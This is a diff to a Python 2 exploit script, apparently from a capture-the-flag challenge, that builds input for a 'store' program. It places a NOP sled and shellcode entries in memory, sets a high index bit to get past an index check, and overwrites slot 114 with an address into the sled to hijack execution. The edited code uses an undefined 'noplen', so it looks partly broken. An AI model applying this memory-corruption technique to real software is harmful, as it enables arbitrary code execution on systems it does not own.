@@ -20,6 +20,9 @@ shell = [
 def getIndex(i):
         return i if i % 3 != 0 else i | 0x40000000
 
+def swap32(i):
+    return struct.unpack(">I", struct.pack("<I", i))[0]
+
 num_nops = 80
 for i in range(num_nops):
         print 'store'
@@ -28,11 +31,11 @@ for i in range(num_nops):
 
 for i,v in enumerate(shell):
         print 'store'
-        print v
-        print getIndex(i + num_nops)
+        print swap32(v)
+        print getIndex(i+noplen)
 
 print 'store'
 # override
 print 0xffffdb30
-print 0x40000072
+print getIndex(114)
 print 'quit'
